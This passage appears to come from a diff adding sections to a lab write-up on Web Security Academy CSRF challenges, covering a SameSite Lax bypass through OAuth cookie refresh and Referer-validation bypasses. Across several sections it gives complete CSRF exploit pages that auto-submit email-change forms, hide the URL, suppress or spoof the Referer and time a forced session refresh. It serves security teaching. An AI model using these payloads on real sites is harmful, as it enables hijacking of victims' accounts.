@@ -1042,4 +1042,260 @@ Use the password in the messages to log in as `carlos` to solve the lab.
 
 > NOTE: Check out [walkthrough](csrf_lab08_zaproxy.md) of this lab in OWASP Zed Attack Proxy
 
+## Bypassing SameSite Lax restrictions with newly issued cookies
 
+Cookies with `SameSite=Lax` are typically not included in cross-site POST requests, but there are notable exceptions. As previously discussed, if a site sets a cookie without specifying a `SameSite` attribute, Chrome assigns `Lax` by default. However, to preserve compatibility with single sign-on (SSO) systems, Chrome allows these cookies to be sent with top-level POST requests for the first 120 seconds after they're set. This creates a two-minute window during which cross-site attacks are still possible.
+
+> NOTE: This grace period does not apply to cookies that were explicitly set with `SameSite=Lax`.
+
+Although timing an attack to land within this brief window can be difficult, there are ways around it. If you can trigger functionality that forces the user's browser to receive a fresh session cookie --- such as completing an OAuth login --- you could reset the timer and immediately follow up with the attack. This works because OAuth flows often issue a new session without checking if the user is already logged in. 
+
+### Bypassing SameSite Lax restrictions with newly issued cookies - Continued
+
+To refresh the victim's cookie without requiring them to manually log in again, you need to initiate a __top-level navigation__. This ensures the current OAuth session cookies are sent. However, this introduces a challenge: you then need a way to redirect the victim back to your own site to carry out the CSRF attack. 
+
+An alternative method is to launch the cookie refresh in a __new tab__, allowing you to preserve the original page for your follow-up attack. The downside is that browsers block pop-up labs unless triggered by a direct user action. For instance, running this directly will typically be blocked:
+
+```
+window.open('https://vulnerable-website.com/login/sso');
+```
+
+To work around this, wrap the `window.open()` call inside an `onclick` event, like so:
+
+```
+window.onclick = () => {
+  window.open('https://vulnerable-website.com/login/sso');
+};
+```
+
+This ensures the new tab opens only after the user click on the page, satisfying the browser's requirement for user interaction. 
+
+### Lab: SameSite Lax bypass via cookie refresh
+
+In Burp's browser, log in via your social media account with credentials `wiener:peter` and change your email address. Find the `POST /my-account/change-email` request in __Proxy__ > __HTTP History__: 
+
+```
+POST /my-account/change-email HTTP/2
+...
+email=attacker%40fakemail.com
+```
+
+Notice that it does not contain any unpredictable tokens, so it may be vulnerable to CSRF if you can bypass any SameSite cookie restrictions. 
+
+Find `GET /oauth-callback?code=[...]` request in __Proxy__ > __HTTP History__ and check its response. 
+
+```
+HTTP/2 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: session=szr3DcM0S13RyB3O9eYBwEEsRgwDQiy0; Expires=Sat, 26 Apr 2025 15:17:11 UTC; Secure; HttpOnly
+X-Frame-Options: SAMEORIGIN
+Content-Length: 2948
+```
+
+Notice that the website doesn't explicitly specify any SameSite restrictions when setting session cookies. As a result, the browser will use the default `LAX` restriction level.
+
+In the browser, go to the exploit server. Create a basic CSRF attack for changing the victim's email address:
+
+```
+<script>
+    history.pushState('', '', '/')
+</script>
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="foo@bar.com" />
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+The first `<script></script>` block changes the visible URL in the browser's address bar to `/`, but without actually navigating or reloading the page. This is meant to hide the true malicious URL.
+
+The `<form></form>` block is a `POST` request to the vulnerable target site's `change-email` endpoint.
+
+The second `<script></script>` block automatically submits the form as soon as the page loads. 
+
+Paste this exploit in the "Body" section of the exploit server's form and click "Store". Click "View exploit". 
+
+> NOTE: If 2 minutes haven't passed since you logged in, this will automatically change your email to `foo@bar.com`. If it's over 2 minutes since you logged in, then it only log you in once again and then, all you have to do is immediately go back to exploit server and click "View exploit" in under 2 minutes.
+
+Once the exploit has been successful, find `POST /my-account/change-email` request under __Proxy__ > __HTTP history__, specifically the one initiated by your exploit. Notice that it included the `session` cookie you were assigned once you logged in and it added a new one to it as well. 
+
+If you visit `/social-login`, this automatically initiates the full OAuth flow. If you check it in __Proxy__ > __HTTP history__ you'll notice that after every OAuth flow, the target site sets a new session cookie even if you were already logged in. 
+
+Back in the exploit server, change our original payload (the second `<script></script>` block) so that it first refreshes the victim's session by forcing their browser to visit `/social-login`, then submits the email change request after a short pause:
+
+```
+<script>
+    history.pushState('', '', '/')
+</script>
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="bar@foo.com" />
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+    setTimeout(changeEmail, 5000);
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+</script>
+```
+
+Click "Store" and then "View exploit". Notice that the initial request gets blocked by the browser's popup blocker. After a pause of 5 seconds the attack is still launched. However this is only successful if it has been less than two minutes since your cookie was set. If not the attack fails because the popup blocker prevents the forced cookie refresh. 
+
+The popup is being blocked, because you haven't manually interacted with the page. Wrap the popup function code inside a `window.onclick` attribute so that it only opens the popup once the user clicks:
+
+```
+<script>
+    history.pushState('', '', '/')
+</script>
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="far@boo.com" />
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    window.onclick = () => {
+        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+        setTimeout(changeEmail, 5000);
+    }
+
+    function changeEmail(){
+        document.forms[0].submit();
+    }
+</script>
+```
+
+Click "Store" and then "View exploit". When prompted, click the page. This triggers the OAuth flow and issues you a new session cookie. After 5 seconds, notice that the CSRF attack is sent and the POST /my-account/change-email request includes your new session cookie. 
+
+Deliver the exploit to the victim to solve the lab.
+
+> NOTE: Walkthrough of this lab in OWASP Zed Attack Proxy is not included, because the functionality of ZAP to be used to solve this lab has been extensively covered in other labs. 
+
+## Bypassing Referer-based CSRF defenses
+
+In addition to using CSRF tokens, some applications attempt to defend against CSRF attacks by checking the HTTP __Referer__ header to confirm the request originated from their own domain. However, this method is typically less reliable and can often be bypassed. 
+
+The HTTP __Referer__ header (misspelled in the original HTTP spec) is an optional field that indicates the URL of the page that initiated the request. Browsers usually include it automatically when users perform actions like clicking a link or submitting a form. However, there are several ways the referring page can suppress or alter this header --- commonly done to preserve user privacy. 
+
+## Validation of Referer depends on header being present
+
+Some applications check the __Referer__ header when it's included in a request but fail to perform any validation if the header is missing. 
+
+This creates an opportunity for attackers to design a CSRF exploit that deliberately causes the victim's browser to omit the __Referer__ header. One simple method to do this is by adding a `<meta>` tag to the CSRF page like this:
+
+```
+<meta name="referrer" content="never">
+```
+
+This instructs the browser not to send the __Referer__ header at all. 
+
+### Lab: CSRF where Referer validation depends on header being present. 
+
+Open Burp's browser and log in as `wiener:peter`. Update your email and find the resulting `POST /my-account/change-email` request in __Proxy__ > __HTTP history__. 
+
+Right-click the request and select "Send to Repeater". Once in Repeater, change the domain in Referer HTTP header and send. Observe that request is rejected:
+
+```
+HTTP/2 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 24
+
+"Invalid referer header"
+```
+
+Delete the __Referer__ header, click Send. Observe that the request is now accepted. 
+
+```
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+Create and host a proof of concept exploit and include the `<meta name="referrer" content="no-referrer">` to suppress the Referer header:
+
+```
+<meta name="referrer" content="no-referrer">
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="anything%40web-security-academy.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
+
+Click "Store" and then "Deliver exploit to victim" to solve the lab.
+
+> NOTE: Skipping OWASP Zed Attack Proxy walkthrough of this lab. These functions of ZAP are already extensively covered.
+
+## Validation of Referer can be circumvented
+
+Some applications perform overly simplistic checks on the __Referer__ header, making them vulnerable to bypasses. For instance, if the app only checks that the __Referer__ domain starts with a certain string, an attacker can exploit this by embedding that domain as a subdomain of their own:
+
+```
+http://vulnerable-website.com.attacker-website.com/csrf-attack
+```
+
+Similarly, if the validation merely looks for the presence of the trusted domain anywhere in the __Referer__, an attacker can include it in a query parameter:
+
+```
+http://attacker-website.com/csrf-attack?vulnerable-website.com
+```
+
+> NOTE: While tools like Burp Suite might show these tricks working, browsers often strip out query strings from the __Referer__ header to protect sensitive information. To prevent this stripping and ensure the full URL is sent, you can include the following header in your exploit's response:
+
+```
+Referrer-Policy: unsafe-url
+```
+
+### Lab: CSRF with broken Referer validation
+
+In Burp's browser log into the lab as `wiener:peter` and update your email. Navigate to `POST /my-account/change-email` request in __Proxy__ > __HTTP history__. 
+
+Send the request to __Repeater__ and change the domain in `Referer` header and click Send. Notice that the request is rejected.
+
+Copy the original domain of your lab instance and append it to the `Referer` header in the form of a query string, or like this:
+
+```
+Referer: https://foobar.net?YOUR-LAB-ID.web-security-academy.net
+```
+
+The response should be:
+
+```
+HTTP/2 302 Found
+Location: /my-account?id=wiener
+X-Frame-Options: SAMEORIGIN
+Content-Length: 0
+```
+
+As you can see the request is now accepted. The websute seems to accept any `Referer` header as long as it contains the expected domain somewhere in the string. 
+
+Create a CSRF proof of concept exploit and host it on the exploit server. Edit the JavaScript so that the third argument of the `history.pushState()` function includes a query string with your lab instance URL as follows: 
+
+```
+<script>
+  history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
+</script>
+<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="anything%40web-security-academy.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+```
+
+This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.
+
+In the "Head" section of the exploit server form, include the following header to override the browser stripping query string from the `Referer` header:
+
+```
+Referrer-Policy: unsafe-url
+```
+
+Click "Store" and then "Deliver exploit to victim" to solve the lab.
+
+> Next write-up: [Clickjacking (UI redressing)](../psa_clickjacking/README.md)
